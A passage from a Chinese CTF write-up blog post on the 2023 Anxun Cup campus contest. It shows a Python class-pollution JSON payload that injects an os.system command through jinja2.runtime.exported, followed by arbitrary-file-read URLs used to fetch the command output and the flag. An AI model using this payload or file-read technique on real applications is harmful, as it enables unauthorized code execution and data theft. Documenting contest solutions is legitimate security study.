+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226235550655.png" srcset="/img/loading.gif" lazyload alt="image-20231226235550655"></p>
+<p>直接一把梭哈</p>
+<div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__init__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>
+    <span class="hljs-attr">&quot;__globals__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>
+        <span class="hljs-attr">&quot;__loader__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>
+            <span class="hljs-attr">&quot;__init__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>
+                <span class="hljs-attr">&quot;__globals__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>
+                    <span class="hljs-attr">&quot;sys&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>
+                        <span class="hljs-attr">&quot;modules&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>
+                            <span class="hljs-attr">&quot;jinja2&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>
+                                <span class="hljs-attr">&quot;runtime&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>
+                                    <span class="hljs-attr">&quot;exported&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span>
+                                        <span class="hljs-string">&quot;*;__import__(&#x27;os&#x27;).system(&#x27;ls /app &gt; /app/a&#x27;);#&quot;</span>
+                                    <span class="hljs-punctuation">]</span>
+                                <span class="hljs-punctuation">&#125;</span>
+                            <span class="hljs-punctuation">&#125;</span>
+                        <span class="hljs-punctuation">&#125;</span>
+                    <span class="hljs-punctuation">&#125;</span>
+                <span class="hljs-punctuation">&#125;</span>
+            <span class="hljs-punctuation">&#125;</span>
+        <span class="hljs-punctuation">&#125;</span>
+    <span class="hljs-punctuation">&#125;</span>
+<span class="hljs-punctuation">&#125;</span>
+<span class="hljs-punctuation">&#125;</span></code></pre></div>
+
+<p>使用前面任意文件读取</p>
+<div class="code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">47.108</span>.<span class="hljs-number">206.43</span>:<span class="hljs-number">40476</span><span class="hljs-regexp">/api-base/</span>v0<span class="hljs-regexp">/search?file=/</span>app/a&amp;type=text</code></pre></div>
+
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226235051453.png" srcset="/img/loading.gif" lazyload alt="image-20231226235051453"></p>
+<div class="code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">47.108</span>.<span class="hljs-number">206.43</span>:<span class="hljs-number">40526</span><span class="hljs-regexp">/api-base/</span>v0<span class="hljs-regexp">/search?file=/</span>app/EY6zl0isBvAWZFxZMvCCCTS3VRVMvoNi_FLAG&amp;type=text</code></pre></div>
+
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226235119574.png" srcset="/img/loading.gif" lazyload alt="image-20231226235119574"></p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://dce.i-soon.net/#/group/detail/31">安洵DCE平台 (i-soon.net)</a></p>
+<p>[第六届安洵杯网络安全挑战赛 Writeup - Boogiepop Doesn’t Laugh (boogipop.com)](<a target="_blank" rel="noopener" href="https://boogipop.com/2023/12/24/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B">https://boogipop.com/2023/12/24/第六届安洵杯网络安全挑战赛</a> Writeup&#x2F;)</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>安洵杯校园赛2023</div>
+      <div>https://zer0peach.github.io/2023/12/24/安洵杯校园赛2023/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Zer0peach</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年12月24日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/12/24/NCTF2023/" title="NCTF2023">
+                        <span class="hidden-mobile">NCTF2023</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <a href="https://zer0peach.github.io"><span>author:Zer0peach</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
